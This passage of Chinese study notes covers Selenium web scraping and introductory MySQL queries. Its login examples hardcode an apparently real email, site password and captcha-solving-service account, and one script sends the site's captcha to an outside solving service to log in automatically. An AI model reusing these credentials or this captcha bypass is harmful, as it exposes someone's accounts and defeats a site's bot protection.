        # 告诉浏览器. 把该信息保存下来.以后使用我的网站的时候. 带着该cookie信息

        # 保持cookie状态: session
        #session表示会话. 你再session中保存的请求头信息. cookie信息
        # 可以重复使用...
        # 可以帮我们保持住cookie的状态.

        # 它只能帮你保持住, 响应头回来的cookie信息.

    2. 在js中可以动态的修改cookie
    # 有些网站不是通过`响应头`加载的cookie..... 这时候session就不行了....该信息是`js动态`加载的

    # 此时. 我们只能想办法手工去维护cookie的改变策略. 还是要用session....

    # 综上. 我们发请求的时候. 一定要用session

```



# 十二，selenium

## 1，下载配置

```python
## 安装：
pip install selenium

## 它与其他库不同的地方是他要启动你电脑上的浏览器, 这就需要一个驱动程序来辅助. 

## 这里推荐用chrome浏览器

## chrome驱动地址:

http://chromedriver.storage.googleapis.com/index.html
https://googlechromelabs.github.io/chrome-for-testing/#stable
```

![image-20240122193411031](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240122193411031.png)

```python
## 先查看自己谷歌浏览器的版本，我的是120.0.6099.255
```

然后打开这个驱动地址

https://googlechromelabs.github.io/chrome-for-testing/#stable

![image-20240122193642372](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240122193642372.png)

选stable 稳定版

然后在网页上搜索我们的版本，只要前三个部分对应上就行，也就是120.0.6099

如下图，就这样我们找到了我们想要的版本

![image-20240122193954470](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240122193954470.png)

把URL地址复制下载去浏览器下载驱动

![image-20240122194111823](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240122194111823.png)

下完以后解压，发现里面是个exe文件（往后浏览器更新了，驱动也需要重新下载对应版本的）

![image-20240122194328843](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240122194328843.png)

然后关键的来了. 把你下载的浏览器驱动放在python解释器所在的文件夹

Windwos:  py -0p     查看Python路径

Mac: open + 路径

![image-20240122195003848](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240122195003848.png)

到此为止配置就结束了

## 2，selenium导入使用

```Python
from selenium.webdriver import Chrome  # 导入谷歌浏览器的类

# 创建浏览器对象
web = Chrome()  # 如果你的浏览器驱动放在了解释器文件夹

web.get("http://www.baidu.com")  # 输入网址
```

## 2、selenium的基本使用

### 2.1 加载网页：

selenium通过控制浏览器，所以对应的获取的数据都是elements中的内容

```python
from selenium import webdriver
from selenium.webdriver.common.by import By

driver = webdriver.Chrome()
# 访问百度
driver.get("http://www.baidu.com/")
# 截图
driver.save_screenshot("baidu.png")
```

### 2.2 定位和操作：

```python
# 搜索关键字 杜卡迪
driver.find_element(By.ID, "kw").send_keys("杜卡迪")
# 点击id为su的搜索按钮
driver.find_element(By.ID, "su").click()
```

### 3.3 查看请求信息：

```python
driver.page_source   # 获取页面内容
driver.get_cookies()
driver.current_url
```

### 3.4 退出

```python
driver.close()  # 退出当前页面
driver.quit()   # 退出浏览器
```

### 3.5 小结

```python
1. selenium的导包:
    from selenium import webdriver
    
2. selenium创建driver对象:
    driver = webdriver.Chrome()
    
3. selenium请求数据:
    driver.get("http://www.baidu.com/")
    
4. selenium查看数据: 
    driver.page_source
    
5. 关闭浏览器: 
    driver.quit()
    
6. 根据id定位元素: 
    driver.find_element_by_id("kw")/driver.find_element(By.ID, "kw")
    
7. 操作点击事件: 
    click()
    
8. 给输入框赋值:
    send_keys()
    
9，获取cookie：
	driver.get_cookies()
    
10，刷新页面
	driver.refresh()
    
11，执行js代码
	driver.execute_script(f'window.scrollBy(0, {step_length})')
```

### 3-6 小案例

#### 3-6-1 简单案例

找到搜索框，输入内容，找到搜索按钮进行点击

```python
import time

from selenium.webdriver import Chrome  # 导入谷歌浏览器的类

# 创建浏览器对象
from selenium.webdriver.common.by import By

web = Chrome()  # 如果你的浏览器驱动放在了解释器文件夹

web.get("https://www.gushiwen.cn/")  # 输入网址

# 查找搜索框
txtKey = web.find_element(By.ID,'txtKey')

txtKey.send_keys('唐诗')

# 找到点击按钮
search = web.find_element(By.XPATH,'//*[@id="search"]/form/input[3]')
search.click()
print(search)
time.sleep(5)
web.quit()
```

#### 3-6-2 解决登录问题

##### 2-1 基本代码

```Python
import time

from selenium.webdriver import Chrome
from selenium.webdriver.common.by import By

driver = Chrome()
# 访问的网址
driver.get('https://www.gushiwen.cn/')
"""
1  点击我的  到登录页面
2  获取账号节点  输入值
3  获取密码节点  输入值
4  获取验证码节点  输入值
5  点击登录
"""
# 点我的
driver.find_element(By.XPATH, '/html/body/div[1]/div[1]/div/div[2]/div/a[6]').click()

# 获取账号节点
email = driver.find_element(By.ID, 'email')
email.send_keys('793390457@qq.com')
# 获取密码节点
password = driver.find_element(By.ID, 'pwd')
password.send_keys('xlg17346570232')
# 获取验证码节点
yzm = driver.find_element(By.ID, 'code')
yzm.send_keys('1234')
time.sleep(5)

# 点击登录
driver.find_element(By.ID, 'denglu').click()

time.sleep(5)
```

##### 2-2 打码平台

```python
import base64
import json
import requests
import time

from selenium.webdriver import Chrome
from selenium.webdriver.common.by import By


def base64_api(uname, pwd, img, typeid):
    with open(img, 'rb') as f:
        base64_data = base64.b64encode(f.read())
        b64 = base64_data.decode()
    data = {"username": uname, "password": pwd, "typeid": typeid, "image": b64}
    result = json.loads(requests.post("http://api.ttshitu.com/predict", json=data).text)
    if result['success']:
        return result["data"]["result"]
    else:
        #！！！！！！！注意：返回 人工不足等 错误情况 请加逻辑处理防止脚本卡死 继续重新 识别
        return result["message"]
    return ""


if __name__ == "__main__":
    driver = Chrome()
    # 访问的网址
    driver.get('https://www.gushiwen.cn/')
    """
    1  点击我的  到登录页面
    2  获取账号节点  输入值
    3  获取密码节点  输入值
    4  获取验证码节点  输入值
    5  点击登录
    """
    # 点我的
    driver.find_element(By.XPATH, '/html/body/div[1]/div[1]/div/div[2]/div/a[6]').click()

    # 获取账号节点
    email = driver.find_element(By.ID, 'email')
    email.send_keys('793390457@qq.com')
    # 获取密码节点
    password = driver.find_element(By.ID, 'pwd')
    password.send_keys('xlg17346570232')
    # 验证码图片的节点
    img_path = "yzm.jpg"
    # screenshot截图并保存保存
    driver.find_element(By.ID, 'imgCode').screenshot(img_path)
    # 识别验证码
    result = base64_api(uname='luckyboyxlg', pwd='17346570232', img=img_path, typeid=3)
    print(result)
    # 获取验证码节点
    yzm = driver.find_element(By.ID, 'code')
    yzm.send_keys(result)  # 输入识别后的值
    time.sleep(8)
    # 点击登录
    driver.find_element(By.ID, 'denglu').click()
    time.sleep(50)


```

##### 2-3 保存登录后的cookie

```python
import base64
import json
import requests
import time

from selenium.webdriver import Chrome
from selenium.webdriver.common.by import By


def base64_api(uname, pwd, img, typeid):
    with open(img, 'rb') as f:
        base64_data = base64.b64encode(f.read())
        b64 = base64_data.decode()
    data = {"username": uname, "password": pwd, "typeid": typeid, "image": b64}
    result = json.loads(requests.post("http://api.ttshitu.com/predict", json=data).text)
    if result['success']:
        return result["data"]["result"]
    else:
        #！！！！！！！注意：返回 人工不足等 错误情况 请加逻辑处理防止脚本卡死 继续重新 识别
        return result["message"]
    return ""


if __name__ == "__main__":
    driver = Chrome()
    # 访问的网址
    driver.get('https://www.gushiwen.cn/')
    """
    1  点击我的  到登录页面
    2  获取账号节点  输入值
    3  获取密码节点  输入值
    4  获取验证码节点  输入值
    5  点击登录
    """
    # 点我的
    driver.find_element(By.XPATH, '/html/body/div[1]/div[1]/div/div[2]/div/a[6]').click()

    # 获取账号节点
    email = driver.find_element(By.ID, 'email')
    email.send_keys('793390457@qq.com')
    # 获取密码节点
    password = driver.find_element(By.ID, 'pwd')
    password.send_keys('xlg17346570232')
    # 验证码图片的节点
    img_path = "yzm.jpg"
    # screenshot截图并保存保存
    driver.find_element(By.ID, 'imgCode').screenshot(img_path)
    # 识别验证码
    result = base64_api(uname='luckyboyxlg', pwd='17346570232', img=img_path, typeid=3)
    print(result)
    # 获取验证码节点
    yzm = driver.find_element(By.ID, 'code')
    yzm.send_keys(result)  # 输入识别后的值
    time.sleep(8)
    # 点击登录
    driver.find_element(By.ID, 'denglu').click()
    time.sleep(4)
    # 获取cookie保存到本地
    cookies = driver.get_cookies()
    print(cookies)
    with open('cookies.txt', 'w', encoding='UTF-8') as f:
        f.write(json.dumps(cookies))


```

##### 2-4 携带cookie进行访问

```python
import time
from selenium.webdriver.common.by import By
from selenium.webdriver import Chrome
import json

driver = Chrome()
# 访问登录
driver.get('https://so.gushiwen.cn/user/login.aspx?from=http://so.gushiwen.cn/user/collect.aspx')
# 本地cookie加载
with open('cookies.txt', 'r', encoding='UTF-8') as f:
    cookies = json.loads(f.read())

# cookie加载到selenium中
for cookie in cookies:
    driver.add_cookie(cookie)

# 刷新一下
driver.refresh()

driver.get('https://so.gushiwen.cn/user/collect.aspx')

time.sleep(10)
```

#### 3-6-3 抓取网易

```Python
import time
from selenium.webdriver import Chrome
from selenium.webdriver.common.by import By


def window_scroll(driver, stop_length, step_length):
    '''
    向下滚动方法封装
    :param driver: selenium对象
    :param stop_length: 滚动终止值
    :param step_length: 每次滚动步长
    :return:
    '''
    while True:
        # 终止不滚的条件
        if stop_length - step_length <= 0:
            driver.execute_script(f'window.scrollBy(0, {stop_length})')
            break
        # 执行js代码 向下滚动
        driver.execute_script(f'window.scrollBy(0, {step_length})')
        stop_length -= step_length
        time.sleep(1)  # 1秒滚一下
    # driver.execute_script('window.scrollBy(0, 30000)')
if __name__ == '__main__':
    driver = Chrome()
    driver.get('https://news.163.com/')
    stop_length = 30000  # 终止值
    step_length = 2000  # 每次滚动的值
    # 循环5次点击加载更多
    for i in range(1, 6):
        window_scroll(driver, stop_length, step_length)
        # 点击加载更多
        more = driver.find_element(By.XPATH, '//*[@id="index2016_wrap"]/div[3]/div[2]/div[3]/div[2]/div[5]/div/a[3]/div[1]/span')
        # more.click()  # 点击
        driver.execute_script('arguments[0].click()', more)
        print(f'第：{i}次 点击加载更多')
    time.sleep(5)
    # 获取页面所有源代码
    page = driver.page_source
    print(page)
```

## 3、selenium的定位操作

### 1，元素定位的两种写法：

- 直接调用型

  ```python
   el = driver.find_element_by_xxx(value)
   # xxx是定位方式，后面我们会讲，value为该方式对应的值
  ```

- 使用By类型(需要导入By)  建议使用这种方式

  ```python
   # 直接掉用的方式会在底层翻译成这种方式
  from selenium.webdriver.common.by import By
  driver.find_element(By.xxx,value)
  ```

### 2，元素定位的两种方式:

- 精确定位一个元素,返回结果为一个element对象,定位不到则报错

  ```python
  driver.find_element(By.xx, value)  # 建议使用
  driver.find_element_by_xxx(value)
  ```

- 定位一组元素,返回结果为element对象列表,定位不到返回空列表

  ```python
  driver.find_elements(By.xx, value)  # 建议使用
  driver.find_elements_by_xxx(value)
  ```

### 3，元素定位的八种方法:

以下方法在element之后添加s就变成能够获取一组元素的方法

+ By.ID  使用id值定位

  ```python
  el = driver.find_element(By.ID, '')
  el = driver.find_element_by_id()            
  ```

+ By.XPATH 使用xpath定位

  ```python
  el = driver.find_element(By.XPATH, '')
  el = driver.find_element_by_xpath()         
  ```

+ By.TAG_NAME. 使用标签名定位

  ```python
  el = driver.find_element(By.TAG_NAME, '')
  el = driver.find_element_by_tag_name()     
  ```

+ By.LINK_TEXT使用超链接文本定位

  ```python
  el = driver.find_element(By.LINK_TEXT, '')
  el = driver.find_element_by_link_text() 
  ```

+ By.PARTIAL_LINK_TEXT  使用部分超链接文本定位

  ```python
  el = driver.find_element(By.PARTIAL_LINK_TEXT  , '')
  el = driver.find_element_by_partial_link_text()
  ```

+ By.NAME   使用name属性值定位

  ```python
  el = driver.find_element(By.NAME, '')
  el = driver.find_element_by_name()
  ```

+ By.CLASS_NAME     使用class属性值定位

  ```python
  el = driver.find_element(By.CLASS_NAME, '')   
  el = driver.find_element_by_class_name()
  ```

+ By.CSS_SELECTOR   使用css选择器定位

  ```python
  el = driver.find_element(By.CSS_SELECTOR, '')  
  el = driver.find_element_by_css_selector()
  ```

**注意：**

find_element与find_elements区别

```python
1. 只查找一个元素的时候:可以使用find_element(),find_elements()
   find_element()会返回一个WebElement节点对象,但是没找到会报错,而find_elements()不会,之后返回一个空列表
2. 查找多个元素的时候:只能用find_elements(),返回一个列表,列表里的元素全是WebElement节点对象
3. 找到都是节点(标签)
4. 如果想要获取相关内容(只对find_element()有效,列表对象没有这个属性)  使用  .text
5. 如果想要获取相关属性的值(如href对应的链接等,只对find_element()有效,列表对象没有这个属性):使用   .get_attribute("href")      
```

​           

### 4、元素的操作

> find_element_by_xxx方法仅仅能够获取元素对象，接下来就可以对元素执行以下操作 从定位到的元素中提取数据的方法

#### 4.1 从定位到的元素中获取数据

```python
el.get_attribute(key)           # 获取key属性名对应的属性值
el.text                        	# 获取开闭标签之间的文本内容
```

#### 4.2 对定位到的元素的操作

```python
el.click()                      # 对元素执行点击操作

el.submit()                     # 对元素执行提交操作

el.clear()                      # 清空可输入元素中的数据

el.send_keys(data)              # 向可输入元素输入数据
```

### 5，小结

```python
## 1. 根据xpath定位元素:
	driver.find_elements(By.XPATH,"//*[@id='s']/h1/a")
    
## 2. 根据class定位元素:
	driver.find_elements(By.CLASS_NAME, "box")
    
## 3. 根据link_text定位元素:
	driver.find_elements(By.LINK_TEXT, "下载豆瓣 App")
    
## 4. 根据tag_name定位元素:
	driver.find_elements(By.TAG_NAME, "h1")
    
## 5. 获取元素文本内容:
	element.text
    
## 6. 获取元素标签属性: 
	element.get_attribute("href")
    
## 7. 向输入框输入数据: 
	element.send_keys(data)
```



## 4、无头浏览器

我们已经基本了解了selenium的基本使用了. 但是呢, 不知各位有没有发现, 每次打开浏览器的时间都比较长. 这就比较耗时了. 我们写的是爬虫程序. 目的是数据. 并不是想看网页. 那能不能让浏览器在后台跑呢? 答案是可以的

```python
from selenium.webdriver import Chrome
from selenium.webdriver.chrome.options import Options

opt = Options()
opt.add_argument("--headless")
opt.add_argument('--disable-gpu')
opt.add_argument("--window-size=4000,1600")  # 设置窗口大小

web = Chrome(options=opt)
```

```python
from selenium.webdriver import Chrome
from selenium.webdriver.chrome.options import Options

opt = Options()
opt.add_argument("--headless")
opt.add_argument('--disable-gpu')

web = Chrome(options=opt)
web.get('https://www.baidu.com')
print(web.title)
```



## 5、selenium 处理cookie

通过`driver.get_cookies()`能够获取所有的cookie

+ 获取cookie

  ```python
  dictCookies = driver.get_cookies()
  ```

+ 设置cookie

  ```python
  driver.add_cookie(dictCookies)
  ```

+ 删除cookie

  ```python
  #删除一条cookie
  driver.delete_cookie("CookieName")
  # 删除所有的cookie
  driver.delete_all_cookies()
  ```

## 6，其他知识

### 6.1 当你触发了某个事件之后，页面出现了弹窗提示，处理这个提示或者获取提示信息方法如下：

```python
alert = driver.switch_to_alert()
```

### 6.2 页面前进和后退

```python
driver.forward()     # 前进
driver.back()        # 后退
driver.refresh() 		 # 刷新
driver.close()       # 关闭当前窗口
```

### 6.3 设置浏览器最大窗口

```
driver.maximize_window()  #最大化浏览器窗口
```

# 十三，数据库操作

## 1，MySQL

### 1.1 基础知识

```SQL
# DB：数据库，他保存了一系列有组织的数据；
# DBMS：数据库管理系统；
# SQL：结构化查询语言，用来与数据库进行沟通；
```

#### 1.1.1 MySQL服务的登录和退出

```sql
# 1，通过 Windows 自带的客户端
    # 登录：MySQL -h 主机名 -p 端口号 -u 用户名 -p 密码（-p 和密码之间不能有空格）
    # 退出：exit
```

#### 1.1.2 查看数据库的版本号

```sql
## 1，Windows 客户端进入 MySQL,写 SQL 命令 
	select version();
## 2，Windows 客户端写 
	MySQL --version*（结尾没有分号）
```

#### 1.1.3 MySQL 语法规范

```sql
## 1. 不区分大小写，建议关键字大写，表名，列名小写
## 2. 每条命令最好分号结尾；
## 3. 每条命令根据需要进行缩进，换行；
## 4. 注释
    1,单行注释：# 注释内容；
    2,单行注释：-- 注释内容（-- 后面必须有空格）
    3,多行注释：/* 注释内容 */
```

#### 1.1.4 SQL语言

```sql
## 1. DQL：数据查询语言；select
## 2. DML：数据操作语言 增删改
## 3. DDL：数据定义语言
## 4. TCL：事务控制语言
```

### 1.2  DQL 基础查询语言

#### 1.2.1 进阶1：DQL基础查询

##### 1-1 代码格式化

```SQL
## F12 可以对代码进行格式化；
```

##### 1-2 简单查询

```sql
# 查询单个字段
select last_name from employees;

# 查询表中的多个字段
select last_name , salary,email from employees;

# 查询表中的所有字段
select * from employees;

# 查询常量表达式
select 100;
select 'aini';
select 100*98;
select version();
```

##### 1-3 起别名

```sql
## as 关键字

    ## 方式一
        select 98 * 100 as 运算结果
        select last_name as 姓, first_name as 名 from employees;

    ## 方式二 
        select last_name 姓,first_name 名 from employees;

    ## 注意：特殊字符如#,关键字 建议加上双引号;
        select salaty as "out put" from employess;
```

##### 1-4 去重

```sql
# 去重 distinct

## 查询员工表中涉及到的所有部门编号
select distinct department_id from employees;
```

##### 1-5 +的作用

```sql
## 两个操作数是数值，则做加法运算；
## 其中一个为字符串时，试图将其转换为数值，转换成功继续做数值的加法运算；如果转换失败，则将此字符串转换为 0；如果其中一方为 	null，则结果已经为 null；

select "aini" + 20   # 20
select 50 + 30       # 80
select "a" + "b"     # 0
```

##### 1-6 concat函数

```sql
## Null 与任何字段，任何数据拼接结果都是 null

select concat('a','b','c') as 字符连接;
select concat(last_name,first_name) as 姓名 from employees;
```

##### 1-7 IFNULL 函数

```python
## 1，IFNULL(x,y) x 为判断的值，y 为返回的值 ，意思就是假如 x 是 null
select ifnull(commission_puc,0) as 奖金率,commission-puc from employees;

## null 的地方会返回函数里面设置的值，不是null 的地方会返回本身的值
```

#### 1.2.2 进阶2：条件查询

##### 2-1 条件查询分类

```sql
# 按条件表达式进行筛选
	>  < = !=  <>  >=   <=
	
# 按逻辑表达式进行筛选
	&& || !  and  not or
	
# 模糊查询
	like ,  between  and ,  in  , null
```

##### 2-2 条件表达式查询

```sql
# 查询工资>12000的员工信息；
	select * from employees where salaty > 12000;

# 查询部门编号不等于90号的员工名和部门编号
	select last_anme ,department_id from employees where department_id <> 90;
```

##### 2-3 按逻辑表达式筛选

```sql
# 查询员工工资在10000 到 20000 之间的员工名，工资，奖金
	select last_name,salary commistion_put from employees where salary >= 10000 and salary <= 20000;
	
# 查询部门编号不是在90 到 110 之间的，或者工资高于15000的员工信息；
	select * from employees where department_id < 90 or department_id > 110 or salary > 15000;
	select * from employees where not  (department_id >= 90 and department_id <= 110) or salary > 15000;
```

##### 2-4 模糊查询

###### 4.1  通配符

```sql
# %表示任意多个字符，也包含零个字符；
# _表示任意单个字符
```

###### 4-2 like

```sql
# 查询员工名中包含字符a的员工信息
	select * from employees where last_name like '%a%';

# 查询员工名中第三个字符为e的，第五个字符为a的员工名
	select last_name from employees where last_name like '__e_a%'

# 查询员工名中第二字符为下划线的员工名
	select last_name from employees where last_name like '_\_%';  # 需要对下划线进项转义

# 自定义转义符号
	select last_name from employees where last_name like '_$_%' escape '$';
	select last_name from employees where last_name like '_z_%' escape 'z';
```

###### 4-3 between and

```sql
# 包含临界值，临界值不能颠倒

# 查询员工编号在100到120之间的员工信息
	select * from employees where employee_id between 100 and 120;
```

###### 4-4 in

```sql
## 判断值是否等于in列表中的某一项
## 不支持括号里使用通配符
## in 列表的值类型必须统一或兼容

# 查询员工的工种编号是IT_PROG,AD_VP,AD_PRES 中的一个工种名和工种编号；
	select last_name ,job_id from employees where job_id in ('IT_PROG','AD_VP','AD_PRES')
```

###### 4-5 is null

```sql
## 不能用来判断字段值是否为空

## 查询没有奖金的员工和奖金率
	select last_name,commistion_pct from employees where commisstion_pct is null
	## = 不能判断字段值是否为Null，所以使用is null

## 查询有奖金的员工和奖金率
	select last_name,commistion_pct from employees where commission-pct is not null
```

###### 4-6 安全等于

```sql
#案例1：查询没有奖金的员工名和奖金率
SELECT
	last_name,
	commission_pct
FROM
	employees
WHERE
	commission_pct <=>NULL;	
	
#案例2：查询工资为12000的员工信息
SELECT
	last_name,
	salary
FROM
	employees

WHERE 
	salary <=> 12000;
```



###### 4-7 Isnull函数

```sql
## 功能：判断一个字段值是否为 null；
## Isnull（字段名），就一个参数，值为 null 返回 1，值不是为空则返回 0；

# IS NULL:仅仅可以判断NULL值，可读性较高，建议使用
## <=>   :既可以判断NULL值，又可以判断普通的数值，可读性较低
```

#### 1.2.3 进阶3：排序

```SQL
/*
特点：
1、asc代表的是升序，可以省略   desc代表的是降序
2、order by子句可以支持 单个字段、别名、表达式、函数、多个字段
3、order by子句在查询语句的最后面，除了limit子句
*/

#1、按单个字段排序
SELECT * FROM employees ORDER BY salary DESC;

#2、添加筛选条件再排序
#案例：查询部门编号>=90的员工信息，并按员工编号降序
SELECT *
FROM employees
WHERE department_id>=90
ORDER BY employee_id DESC;

#3、按表达式排序
#案例：查询员工信息 按年薪降序
SELECT *,salary*12*(1+IFNULL(commission_pct,0))
FROM employees
ORDER BY salary*12*(1+IFNULL(commission_pct,0)) DESC;

#4、按别名排序
#案例：查询员工信息 按年薪升序
SELECT *,salary*12*(1+IFNULL(commission_pct,0)) 年薪
FROM employees
ORDER BY 年薪 ASC;

#5、按函数排序
#案例：查询员工名，并且按名字的长度降序

SELECT LENGTH(last_name),last_name 
FROM employees
ORDER BY LENGTH(last_name) DESC;

#6、按多个字段排序
#案例：查询员工信息，要求先按工资降序，再按employee_id升序
SELECT *
FROM employees
ORDER BY salary DESC,employee_id ASC;

```

![img](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/wps1.png)

```SQL
## Order by 语句一般放在最后
```

#### 1.2.4 进阶4：常见函数介绍

##### 4-1 分类

```SQL
## 分类：
	## 单行函数：
		## Concat() ; length() ; ifnull() ; isnull() 等；
	## 分组函数：
		## 功能：做统计使用，统计函数；
			
##单行函数：
    ## 1. 字符函数：
    ## 2. 数学函数：
    ## 3. 日期函数：
    ## 4. 其他函数：
    ## 5. 流程控制函数：
```

##### 4-2 字符函数

###### 2-1 length(str)

```sql
## 注一个汉字占三个字节

SELECT LENGTH('john');
SELECT LENGTH('张三丰hahaha');

SHOW VARIABLES LIKE '%char%'
```

###### 2-2 concat

```sql
SELECT CONCAT(last_name,'_',first_name) 姓名 FROM employees;
```



###### 2-3 upper,lower

```python
SELECT UPPER('john');
SELECT LOWER('joHn');
#示例：将姓变大写，名变小写，然后拼接
SELECT CONCAT(UPPER(last_name),LOWER(first_name))  姓名 FROM employees;
```



###### 2-4 substr,substring

```sql
# 注意：索引从1开始
#截取从指定索引处后面所有字符
SELECT SUBSTR('李莫愁爱上了陆展元',7)  out_put;

#截取从指定索引处指定字符长度的字符
SELECT SUBSTR('李莫愁爱上了陆展元',1,3) out_put;

#案例：姓名中首字符大写，其他字符小写然后用_拼接，显示出来

SELECT CONCAT(UPPER(SUBSTR(last_name,1,1)),'_',LOWER(SUBSTR(last_name,2)))  out_put FROM employees;
```

```sql
## 可以放三个参数，第一个为字段或要截取的字符串，第二个是开始位置的索引，第三个是长度
```

###### 2-5 instr

```sql
## Instr 返回一个小字符串在大字符串里面的第一次出现的起始索引找不到就返回 0
SELECT INSTR('杨不殷六侠悔爱上了殷六侠','殷八侠') AS out_put;
```

###### 2-6 trim

```sql
# 只去掉前后的空格或者前后的某个指定字符
SELECT LENGTH(TRIM('    张翠山    ')) AS out_put;

SELECT TRIM('aa' FROM 'aaaaaaaaa张aaaaaaaaaaaa翠山aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')  AS out_put;
```

###### 2-7 lpad

```sql
## lpad 在左边填充指定字符，到指定长度（指定长度指的是总长度）
SELECT LPAD('殷素素',2,'*') AS out_put;
```

###### 2-8 rpad

```sql
## 8，rpad 右填充，跟lpad同理
SELECT RPAD('殷素素',12,'ab') AS out_put;
```

###### 2-9 replace

```sql
## replace 替换 ，可以把所有被替换的内容都替换掉
## 三个参数(字符串,’被替换的内容’,’替换的新内容’)
SELECT REPLACE('周芷若周芷若周芷若周芷若张无忌爱上了周芷若','周芷若','赵敏') AS out_put;
```

##### 4-3 数学函数

###### 3-1 round

```sql
## 一个参数，直接四舍五入到整数，第二个参数可以设置保留的小数位数
SELECT ROUND(1.567,2);
SELECT ROUND(-1.55);
```

###### 3-2 floor

```sql
SELECT FLOOR(-9.99);
```

###### 3-3 ceil 

```sql
SELECT CEIL(-1.02);
```



###### 3-4 truncate截断

```sql
SELECT TRUNCATE(1.69999,1);
## 结果是 1.6
```

###### 3-5 mod

```sql
SELECT MOD(10,-3);
SELECT 10%3;
```

##### 4-3  日期函数

###### 3-1 now

```sql
#now 返回当前系统日期+时间
SELECT NOW();
```

###### 3-2 curdate

```sql
#curdate 返回当前系统日期，不包含时间
SELECT CURDATE();
```

###### 3-3 curtime

```sql
#curtime 返回当前时间，不包含日期
SELECT CURTIME();
```

###### 3-4 获取指定部分

```sql
#可以获取指定的部分，年、月、日、小时、分钟、秒
SELECT YEAR(NOW()) 年;
SELECT YEAR('1998-1-1') 年;

SELECT  YEAR(hiredate) 年 FROM employees;

SELECT MONTH(NOW()) 月;
SELECT MONTHNAME(NOW()) 月;


#str_to_date 将字符通过指定的格式转换成日期
SELECT STR_TO_DATE('1998-3-2','%Y-%c-%d') AS out_put;

#查询入职日期为1992--4-3的员工信息
SELECT * FROM employees WHERE hiredate = '1992-4-3';

SELECT * FROM employees WHERE hiredate = STR_TO_DATE('4-3 1992','%c-%d %Y');


#date_format 将日期转换成字符
SELECT DATE_FORMAT(NOW(),'%y年%m月%d日') AS out_put;

#查询有奖金的员工名和入职日期(xx月/xx日 xx年)
SELECT last_name,DATE_FORMAT(hiredate,'%m月/%d日 %y年') 入职日期
FROM employees
WHERE commission_pct IS NOT NULL;

```

##### 4-4 其他函数

```sql
SELECT VERSION();
SELECT DATABASE();
SELECT USER();
```

##### 4-5 流程控制函数

###### 5-1 if函数

```sql
#1.if函数： if else 的效果

SELECT IF(10<5,'大','小');

SELECT last_name,commission_pct,IF(commission_pct IS NULL,'没奖金，呵呵','有奖金，嘻嘻') 备注
FROM employees;
```

###### 5-2 case函数的使用

```sql
/*
case 要判断的字段或表达式
when 常量1 then 要显示的值1或语句1;
when 常量2 then 要显示的值2或语句2;
...
else 要显示的值n或语句n;
end
*/

/*案例：查询员工的工资，要求

部门号=30，显示的工资为1.1倍
部门号=40，显示的工资为1.2倍
部门号=50，显示的工资为1.3倍
其他部门，显示的工资为原工资

*/

SELECT salary 原始工资,department_id,
CASE department_id
WHEN 30 THEN salary*1.1
WHEN 40 THEN salary*1.2
WHEN 50 THEN salary*1.3
ELSE salary
END AS 新工资
FROM employees;



#3.case 函数的使用二：类似于 多重if
/*
case 
when 条件1 then 要显示的值1或语句1
when 条件2 then 要显示的值2或语句2
。。。
else 要显示的值n或语句n
end
*/

#案例：查询员工的工资的情况
/*
如果工资>20000,显示A级别
如果工资>15000,显示B级别
如果工资>10000，显示C级别
否则，显示D级别
*/

SELECT salary,
CASE 
WHEN salary>20000 THEN 'A'
WHEN salary>15000 THEN 'B'
WHEN salary>10000 THEN 'C'
ELSE 'D'
END AS 工资级别
FROM employees;
```

##### 4-6 分组函数

```sql
/*
功能：用作统计使用，又称为聚合函数或统计函数或组函数
分类：
sum 求和、avg 平均值、max 最大值 、min 最小值 、count 计算个数

特点：
1、sum、avg一般用于处理数值型
   max、min、count可以处理任何类型
2、以上分组函数都忽略null值
3、可以和distinct搭配实现去重的运算
4、count函数的单独介绍
一般使用count(*)用作统计行数
5、和分组函数一同查询的字段要求是group by后的字段
*/
```

###### 6-1 简单的使用

```sql
SELECT SUM(salary) FROM employees;
SELECT AVG(salary) FROM employees;
SELECT MIN(salary) FROM employees;
SELECT MAX(salary) FROM employees;
SELECT COUNT(salary) FROM employees;

SELECT SUM(salary) 和,AVG(salary) 平均,MAX(salary) 最高,MIN(salary) 最低,COUNT(salary) 个数
FROM employees;

SELECT SUM(salary) 和,ROUND(AVG(salary),2) 平均,MAX(salary) 最高,MIN(salary) 低,COUNT(salary) 个数
FROM employees;

```

###### 6-2 参数支持那些类型

```sql
SELECT SUM(last_name) ,AVG(last_name) FROM employees;
SELECT SUM(hiredate) ,AVG(hiredate) FROM employees;

SELECT MAX(last_name),MIN(last_name) FROM employees;

SELECT MAX(hiredate),MIN(hiredate) FROM employees;

SELECT COUNT(commission_pct) FROM employees;
SELECT COUNT(last_name) FROM employees;
```

###### 6-3 能否忽略null

```sql
SELECT 
SUM(commission_pct),
AVG(commission_pct),
SUM(commission_pct)/35,
SUM(commission_pct)/107 
FROM employees;

SELECT MAX(commission_pct) ,MIN(commission_pct) FROM employees;

SELECT COUNT(commission_pct) FROM employees;
SELECT commission_pct FROM employees;
```

###### 6-3 和distinct搭配

```sql
SELECT SUM(DISTINCT salary),SUM(salary) FROM employees;

SELECT COUNT(DISTINCT salary),COUNT(salary) FROM employees;
```

###### 6-5 count函数的详细介绍

```sql
SELECT COUNT(salary) FROM employees;

SELECT COUNT(*) FROM employees;

SELECT COUNT(1) FROM employees;

效率：
## MYISAM存储引擎下  ，COUNT(*)的效率高
## INNODB 存储引擎下，COUNT(*)和COUNT(1)的效率差不多，比COUNT(字段)要高一些
```

###### 6-6 和分组函数一同查询的字段有限制

```sql
SELECT AVG(salary),employee_id  FROM employees;
```

###### 6-7 datediff函数

```SQL
## 返回两个日期相差的天数
select datediff('2017-10-1','2017-05-18');
select datediff(max(hiredate),min(hiredate)) from employees;
```

#### 1.2.5 进阶5：分组查询

```sql
/*
语法：
select 查询列表
from 表
【where 筛选条件】
group by 分组的字段
【order by 排序的字段】;

特点：
1、和分组函数一同查询的字段必须是group by后出现的字段
2、筛选分为两类：分组前筛选和分组后筛选
		针对的表			位置		连接的关键字
分组前筛选	原始表				group by前	where
	
